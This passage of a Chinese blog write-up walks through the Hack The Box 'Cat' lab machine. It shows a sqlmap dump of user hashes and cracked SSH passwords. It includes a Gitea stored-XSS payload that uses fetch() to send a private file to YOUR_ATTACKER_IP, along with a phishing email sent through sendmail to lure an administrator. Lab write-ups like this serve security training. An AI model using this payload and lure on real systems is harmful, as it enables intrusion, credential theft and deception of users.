\</span><br><span class="line">-p catName \</span><br><span class="line">--dbms=SQLite \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3 \</span><br><span class="line">-D SQLite_masterdb -T <span class="built_in">users</span> --dump \</span><br><span class="line">--batch \</span><br><span class="line">--threads=10 \</span><br><span class="line">--tamper=space2comment \</span><br><span class="line">--random-agent \</span><br><span class="line">--time-sec=10</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506205902187.png" alt="image-20250506205902187"></p>
+<p><code>sqlmap</code> 成功 dump 出了 <code>users</code> 表的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+---------+-------------------------------+----------------------------------+----------+</span><br><span class="line">| user_id | email                         | password                         | username |</span><br><span class="line">+---------+-------------------------------+----------------------------------+----------+</span><br><span class="line">| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel     |</span><br><span class="line">| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa     |</span><br><span class="line">| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert   |</span><br><span class="line">| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian   |</span><br><span class="line">| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson |</span><br><span class="line">| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry    |</span><br><span class="line">| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer    |</span><br><span class="line">| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter    |</span><br><span class="line">| &lt;blank&gt; | angel234g@hukkp1hpp           | &lt;blank&gt;                          | &lt;blank&gt;  |</span><br><span class="line">| &lt;blank&gt; | &lt;blank&gt;                       | &lt;blank&gt;                          | &lt;blank&gt;  |</span><br><span class="line">| &lt;blank&gt; | &lt;blank&gt;                       | &lt;blank&gt;                          | &lt;blank&gt;  |</span><br><span class="line">+---------+-------------------------------+----------------------------------+----------+</span><br></pre></td></tr></table></figure>
+<h4 id="2-4-密码破解与-SSH-登录-rosa">2.4 密码破解与 SSH 登录 (rosa)</h4>
+<p>将这些密码哈希提交到在线破解网站，如 <a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a>。<br>
+<code>rosa</code> 用户的哈希 <code>ac369922d560f17d6eeb8b2c7dec498c</code> 成功被破解。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506214118921.png" alt="image-20250506214118921"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506213928007.png" alt="image-20250506213928007"></p>
+<p>密码是 <code>soyunaprincesarosa</code>。</p>
+<p>尝试使用这个凭证通过 SSH 登录 <code>rosa</code> 用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh rosa@10.10.11.53</span><br><span class="line"><span class="comment"># Password: soyunaprincesarosa</span></span><br></pre></td></tr></table></figure>
+<h3 id="三、权限提升至-axel">三、权限提升至 axel</h3>
+<h4 id="3-1-内部信息搜集">3.1 内部信息搜集</h4>
+<p>登录 <code>rosa</code> 用户后，需要寻找提升到 <code>axel</code> 用户权限的方法。日志文件通常是信息泄露的常见位置。检查 <code>/var/log</code> (或者其他可能的日志路径) 是否有 <code>axel</code> 用户的活动记录或敏感信息。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506222900287.png" alt="image-20250506222900287"></p>
+<p>发现了 <code>axel</code> 用户的明文密码：<code>aNdZwgC4tI9gnVXv_e3Q</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223044217.png" alt="image-20250506223044217"></p>
+<h4 id="3-2-SSH-登录-axel">3.2 SSH 登录 axel</h4>
+<p>使用找到的凭证 SSH 登录 <code>axel</code> 用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh axel@10.10.11.53</span><br><span class="line"><span class="comment"># Password: aNdZwgC4tI9gnVXv_e3Q</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223312577.png" alt="image-20250506223312577"></p>
+<p>成功登录 <code>axel</code>！可以在其家目录下找到 <code>user.txt</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223421594.png" alt="image-20250506223421594"></p>
+<p>至此，已经拿到了 <code>user</code> 权限。</p>
+<h3 id="四、提权至-Root：利用内部-Gitea-服务">四、提权至 Root：利用内部 Gitea 服务</h3>
+<h4 id="4-1-阅读邮件，发现新目标">4.1 阅读邮件，发现新目标</h4>
+<p>在 <code>axel</code> 用户 <code>/var/mail/</code> 中，发现了邮件信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/mail/axel</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510100935700.png" alt="image-20250510100935700"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510101421453.png" alt="image-20250510101421453"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510101105002.png" alt="image-20250510101105002"></p>
+<p>其中一封来自 <code>rosa@cat.htb</code> 的邮件提到了一个新的 “Employee management” 系统，其 Gitea 仓库地址为 <code>http://localhost:3000/administrator/Employee-management/</code>，并且 <code>README.md</code> 文件的直接链接为 <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md</code>。<br>
+另一封邮件则要求 <code>axel</code> 将其 Gitea 仓库信息发送给 <code>jobert@localhost</code> 进行审核。</p>
+<p>这些信息表明：</p>
+<ol>
+<li>系统内部运行着一个 Gitea 服务 (<code>localhost:3000</code>)。</li>
+<li><code>administrator</code> 是 Gitea 上的一个高权限用户（可能与 <code>jobert</code> 相关）。</li>
+<li><code>jobert</code> 会审查 Gitea 仓库。</li>
+</ol>
+<h4 id="4-2-端口转发访问内部-Gitea">4.2 端口转发访问内部 Gitea</h4>
+<p>Gitea 是一个 Web 应用，需要图形化的浏览器来交互，所以需要做<strong>端口转发</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105003158.png" alt="image-20250510105003158"></p>
+<p>(确保攻击机的防火墙允许 <code>12345</code> 端口入站)</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105802675.png" alt="image-20250510105802675"><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105738451.png" alt="image-20250510105738451"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110102470.png" alt="image-20250510110102470"></p>
+<p>现在，可以在攻击机的浏览器上访问靶机内部的 Gitea 服务了。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110158603.png" alt="image-20250510110158603"></p>
+<p>使用 <code>axel</code> 用户的 Gitea 凭证（与其 SSH 密码相同：<code>aNdZwgC4tI9gnVXv_e3Q</code>）登录。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110452621.png" alt="image-20250510110452621"></p>
+<p>登录后，可以看到 Gitea 的版本信息：<strong>1.22.0</strong>。</p>
+<h4 id="4-3-Gitea-Stored-XSS-漏洞利用">4.3 Gitea Stored XSS 漏洞利用</h4>
+<p>搜索 Gitea 1.22.0 版本的漏洞，发现存在一个 Stored XSS 漏洞</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110701864.png" alt="image-20250510110701864"></p>
+<p>可以利用 <code>axel</code> 用户的权限，在他自己的一个仓库（例如新建一个名为 <code>xss-exploit</code> 的仓库）的描述 (Description) 中植入 XSS Payload。</p>
+<p><strong>测试 XSS Payload (弹窗):</strong></p>
+<p>先用一个简单的弹窗 Payload 测试漏洞是否存在：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124054985.png" alt="image-20250510124054985"><br>
+不小心断开连接了，不过端口转发还在。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124708170.png" alt="image-20250510124708170"><br>
+<em>(创建 xss-exploit 仓库)</em></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124820549.png" alt="image-20250510124820549"><br>
+<em>(在描述中放入 XSS payload)</em></p>
+<p>当访问该仓库页面时，成功弹窗！</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510125431310.png" alt="image-20250510125431310"></p>
+<h4 id="4-4-窃取-administrator-的-index-php-文件">4.4 窃取 administrator 的 index.php 文件</h4>
+<p>的目标是读取 <code>administrator</code> 用户 <code>Employee-management</code> 仓库中的 <code>index.php</code> 文件内容，因为邮件中提到这是个正在开发的重要系统，可能包含敏感信息。</p>
+<p><strong>思路：</strong><br>
+通过 <code>axel</code> 用户的权限，在 Gitea 中植入一个 XSS Payload。然后诱导 <code>jobert</code> 用户（猜测他就是 Gitea 的 <code>administrator</code>，或者有权限访问该仓库）点击包含该 Payload 的链接。当 <code>jobert</code> 点击时，XSS 会在他的会话上下文中执行，读取 <code>index.php</code> 的内容，并将其发送到的监听服务器。</p>
+<p><strong>注意：</strong> <code>axel</code> 用户直接尝试访问 <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</code> 可能会因为权限不足而失败。但如果是在 <code>administrator</code> (Jobert) 的会话中执行，就能成功。</p>
+<p><strong>XSS Payload (数据窃取):</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:</span></span><br><span class="line"><span class="string">  fetch(&#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#x27;)</span></span><br><span class="line"><span class="string">    .then(response =&gt; &#123;</span></span><br><span class="line"><span class="string">      if (!response.ok) &#123;</span></span><br><span class="line"><span class="string">        throw new Error(&#x27;File fetch failed: &#x27; + response.status + &#x27; &#x27; + response.statusText + &#x27; for &#x27; + response.url);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      return response.text();</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    .then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">      fetch(&#x27;http://YOUR_ATTACKER_IP:YOUR_NC_PORT/?content=&#x27; + encodeURIComponent(data));</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    .catch(error =&gt; &#123;</span></span><br><span class="line"><span class="string">      fetch(&#x27;http://YOUR_ATTACKER_IP:YOUR_NC_PORT/?error=&#x27; + encodeURIComponent(error.toString()));</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;</span>&gt;Click <span class="keyword">for</span> Critical Employee System Info (Index)&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>在 <code>axel</code> 用户的 <code>xss-exploit</code> 仓库的描述中更新此 Payload。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510153041189.png" alt="image-20250510153041189"></p>
+<p>在攻击机上启动 Netcat 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+<h4 id="4-5-发送邮件诱导-Jobert">4.5 发送邮件诱导 Jobert</h4>
+<p>现在，需要诱导 <code>jobert</code> 访问植入了 XSS Payload 的页面并点击链接。根据之前邮件的线索，<code>jobert</code> 会审查仓库。以 <code>axel</code> 的身份给 <code>jobert</code> 发送一封邮件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;Subject: URGENT - Action Required: Employee System Credentials Link\n\nHello Jobert,\n\nFurther to our development of the Employee Management system, critical access information is now available via a link within my xss-exploit project.\n\nPlease visit the repository immediately: http://localhost:3000/axel/xss-exploit\n\n**VERY IMPORTANT: You MUST click the link in the project description (it says &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;Click for Critical Employee System Info (Index)&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;) to retrieve the necessary details.**\n\nThis is time-sensitive.\n\nThanks,\nAxel&#x27;</span> | sendmail jobert@localhost</span><br></pre></td></tr></table></figure>
+<h4 id="4-6-获取-index-php-内容">4.6 获取 index.php 内容</h4>
+<p>等待片刻，如果 <code>jobert</code> 点击了链接，的 Netcat 监听器应该会收到 <code>index.php</code> 的内容：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510152524695.png" alt="image-20250510152524695"></p>
+<p>对接收到的 URL 编码内容进行解码，得到 <code>index.php</code> 的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$valid_username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$valid_password</span> = <span class="string">&#x27;IKw75eR0MR7CMIxhH0&#x27;</span>; <span class="comment">// &lt;--- 敏感凭证！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]) ||</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>] != <span class="variable">$valid_username</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>] != <span class="variable">$valid_password</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Employee Management&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功获取了 “Employee Management” 系统的 Basic Auth 凭证：<code>admin:IKw75eR0MR7CMIxhH0</code>。</p>
+<h4 id="4-7-后续步骤-获取-root-txt">4.7 (后续步骤 - 获取 root.txt)</h4>
+<p>根据靶机设计，最终获取到 <code>root.txt</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510152838994.png" alt="image-20250510152838994"></p>
+<h3 id="五、总结">五、总结</h3>
+<p>Cat 靶机串联了 Web 源码审计、SQL 注入、XSS Cookie 窃取、本地日志信息泄露、内部服务探测、端口转发以及 Stored XSS 利用，希望这篇 Writeup 对大家有所帮助！</p>
+
+<div class="article-footer fs14"></div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/04/29/%E5%91%8A%E8%AD%A6%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5/">告警：网络协议关键字段</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>评论</p>
+
+    </section>
+    <section class='body cmt-body giscus'>
+      
+  <section class='body cmt-body'>
+    <div id="giscus-container"></div>
+    <script src="https://giscus.app/client.js"
+      data-repo="Zero-Yi7/blog-comments"
+      data-repo-id="R_kgDOOUyZ3Q"
+      data-category="Announcements"
+      data-category-id="DIC_kwDOOUyZ3c4Co1L-"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="bottom"
+      data-theme="preferred_color_scheme"
+      data-lang="zh-CN"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async>
+    </script>
+  </section>
+
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><center>
+  <p>© <span id="copyright_year"></span> Rabbit 使用 Stellar 创建</p>
+  <p>✨ 营业：<span id="runtime_span"></span> ✨</p>
+  <p>共发表 <span id="blog_count">56</span> 篇Blog 🔸 总计 <span id="total_words">123.6k</span> 字</p>
+  <script type="text/javascript">
+    (function() {
+      // 动态年份
+      document.getElementById('copyright_year').textContent = new Date().getFullYear();
+
+      // 运行时长
+      const startDate = new Date('2023-12-20T00:00:00');
+      function updateRuntime() {
+        const now = new Date();
+        const diff = now - startDate;
+        const days = Math.floor(diff / (24 * 60 * 60 * 1000));
+        const hours = Math.floor((diff % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+        const minutes = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
+        const seconds = Math.floor((diff % (60 * 1000)) / 1000);
+        document.getElementById('runtime_span').innerHTML =
+          `${days}天-${hours}小时-${minutes}分-${seconds}秒`; // 修改输出格式
+      }
+      setInterval(updateRuntime, 1000);
+      updateRuntime();
+
+      // 博客统计数据 (这里是静态示例，你可以根据实际情况手动更新或动态获取)
+      // document.getElementById('blog_count').textContent = '你的博客文章总数';
